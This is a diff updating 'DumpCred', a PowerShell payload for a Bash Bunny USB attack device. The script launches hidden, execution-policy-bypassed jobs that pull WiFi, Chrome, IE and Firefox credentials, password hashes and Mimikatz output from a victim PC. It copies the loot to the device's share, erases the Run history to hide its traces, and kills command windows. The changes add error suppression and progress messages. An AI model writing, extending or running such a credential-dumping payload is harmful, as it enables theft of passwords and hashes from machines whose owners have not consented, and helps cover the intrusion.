@@ -1,7 +1,7 @@
 ﻿
 <#
 .SYNOPSIS
-   DumpCred 2.0
+   DumpCred 2.1
 .DESCRIPTION
    Dumps all Creds from a PC 
 .PARAMETER <paramName>
@@ -10,8 +10,8 @@
    DumpCred
 #>
 
-$_Version = "2.0.2"
-$_BUILD = "1003"
+$_Version = "2.1.0"
+$_BUILD = "1004"
 
 # Share on bashbunny
 $SHARE="\\172.16.64.1\e"
@@ -70,37 +70,42 @@ $LINE3 | Add-Content $TMPFILE
 Stop-Job *
 Remove-Job *
 
-# Start all Jobs as background jobs
-Write-Host "Wifi-Cred" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-WiFiCreds.ps1} | Out-Null
-Write-Host "ChromeCred" ;  start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-ChromeCreds.ps1} | Out-Null
-Write-Host "IECred" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-IECreds.ps1} | Out-Null
-Write-Host "FireFoxCred" ; start-job -RunAs32 -ArgumentList $SHARE {param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-FoxDump.ps1} | Out-Null
-Write-Host "Inventory" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-Inventory.ps1} | Out-Null
+Write-Host "Wifi-Cred" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-WiFiCreds.ps1} -ErrorAction SilentlyContinue | Out-Null
+Write-Host "ChromeCred" ;  start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-ChromeCreds.ps1} -ErrorAction SilentlyContinue | Out-Null
+Write-Host "IECred" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-IECreds.ps1} -ErrorAction SilentlyContinue | Out-Null
+Write-Host "FireFoxCred" ; start-job -RunAs32 -ArgumentList $SHARE {param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-FoxDump.ps1} -ErrorAction SilentlyContinue | Out-Null
+Write-Host "Inventory" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-Inventory.ps1} -ErrorAction SilentlyContinue | Out-Null
 if ($isAdmin) {
-    Write-Host "Hashes" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Invoke-PowerDump.ps1} | Out-Null
-    Write-Host "M1m1k@tz" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Invoke-M1m1k@tz.ps1} | Out-Null
+    Write-Host "Hashes" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Invoke-PowerDump.ps1} -ErrorAction SilentlyContinue | Out-Null
+    Write-Host "M1m1k@tz" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\invoke-m1m1d0gz.ps1} -ErrorAction SilentlyContinue | Out-Null
 }
-
+Write-host "... Wait for end of jobs"
 # Wait for all jobs
-Get-Job | Wait-Job | Out-Null
+Get-Job | Wait-Job
 
+Write-host "... Receiving results"
 # Receive all results
 Get-Job | Receive-Job | Out-File -Append $TMPFILE
 
 
 
+
 #Move TMP File to Bunny
+Write-host "Moving file to bunny"
 move-item $TMPFILE -Destination $FILE -Force -ErrorAction SilentlyContinue
 
 # Cleanup
 # Remove Run History
 Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
 
+Write-host "... Rename CON_OK to CON_EOF"
 # Rename CON_OK to CON_EOF so bunny knows that all the stuff has finished
 Rename-Item -Path "$SHARE\CON_OK" -NewName "$SHARE\CON_EOF"
 
-# Kill cmd.exe 
+Write-host "... Kill cmds"
+# Kill cmde.exe 
 Stop-Process -name cmd -ErrorAction SilentlyContinue
 
+Write-host "... Remove all Jobs"
 # Remove all Jobs from Joblist
 Remove-Job *
